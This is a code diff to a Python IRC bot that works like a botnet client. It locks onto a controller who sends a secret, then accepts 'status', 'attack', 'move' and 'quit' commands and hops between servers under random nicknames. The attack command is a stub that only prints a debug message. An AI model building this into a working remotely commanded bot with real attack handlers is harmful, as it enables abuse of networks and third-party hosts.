@@ -68,20 +68,16 @@ class PyBot:
   def examinePrivmsg(self,senderNick,senderMessage):
 
     print("DEBUG --> "+senderNick+" says:"+senderMessage)
-
     #This locks the bot permantely to the controller, if secret is entered again it will be ignored
     if senderMessage == secret and self.controlMode == 0:
       print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
       self.controlMode = 1
       self.controllerName = senderNick
-      #self.socket.send(bytes("PRIVMSG " + self.controllerName + " YOURS")) #Crash
 
-    #If controlMode is ennabled, and message sender private/or public enters the command, the bot will respond
     elif self.controlMode == 1 and senderNick == self.controllerName: 
-# NOTE --> The 'attack' and 'move' messages will be followed by who to attack and where to move to, so the tests will have to be .startswith()
       if senderMessage == "status":
-        print("DEBUG --> status requested by controller, sending This Bot Nick via Private Message")
         outMessage = "BotName$$: "+self.nick #parse this on delimiter $$
+        print("DEBUG --> status requested, sending PRIVMSG: '"+outMessage+"' to user: "+self.controllerName) 
         #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
         self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
 
@@ -89,10 +85,7 @@ class PyBot:
         print("DEBUG --> attack requested by controller")
 
       elif senderMessage.split()[0] == "move":
-        print("DEBUG --> move requested by controller")
-        #should we check if the argument has a hash tag or not?
-        print(senderMessage)
-        print(len(senderMessage.split()))
+        print("DEBUG --> move requested by controller")      #NOTE for later #should we check if the argument has a hash tag or not?
         self.changeServer(senderMessage)
 
       elif senderMessage == "quit":
@@ -108,7 +101,7 @@ class PyBot:
         sys.exit()
   
   def changeServer(self,senderMessage):
-
+   
     if len(senderMessage.split()) == 4:
       newHost = senderMessage.split()[1]
       newPort = senderMessage.split()[2]
@@ -117,16 +110,15 @@ class PyBot:
 
       try:
         testSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("DEBUG1")
         testSocket.connect((newHost,int(newPort)))
-        print("DEBUG2")
         self.socket.send(bytes("QUIT \n","UTF-8"))
         self.socket.close()
         self.socket = testSocket  #Set the new socket
         self.host = newHost       #Set the new host
         self.port = newPort       #Set the new port
         self.channel = newChannel #Set the new channel
-
+        self.controlMode = 0      #Reset the controllerMode (bot lock)
+        self.controllerName = ""  #Reset the controllerName (as it might change)
         while True:
           try:
             self.socket.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
@@ -135,17 +127,18 @@ class PyBot:
           except:
             print("DEBUG --> Unable to connect to irc server with this username, trying a new username")
             self.nick = self.generateRandomName()
-
-        self.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel once server connect succeeds
-
+        print("DEBUG8")
+        self.socket.send(bytes("JOIN " + self.channel + "\n", "UTF-8")) #Join channel once server connect succeeds
       except:
-        print("DEBUG --> Either server doesn't exist, it's a secure server, or bad arguments")  
-
+        print("DEBUG --> Either server doesn't exist, it's a secure server, or bad arguments")
     else:
+      print("DEBUG --> Controller tried to move this bot, but wrong number of arguments")
       outMessage = "Cannot move:"+self.nick+ " to a new server, invalid # of arguments"
-      s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
-      outMessage = "Usage> move <host-name> <port> <channel>"  
-      s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
+      outMessage = "Usage> move <host-name> <port> <channel>"
+      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
+      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
 
   def generateRandomName(self):
     #randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
@@ -159,7 +152,7 @@ if __name__ == '__main__':
   if(len(sys.argv) == 5):
     host = sys.argv[1]
     port = sys.argv[2]
-    channel = "#"+sys.argv[3]
+    channel = "#"+sys.argv[3]  #CAn't get it to work if user enters channel with #, do we need this?
     secret = sys.argv[4]
   else:
     print("Incorrect number of arguments")
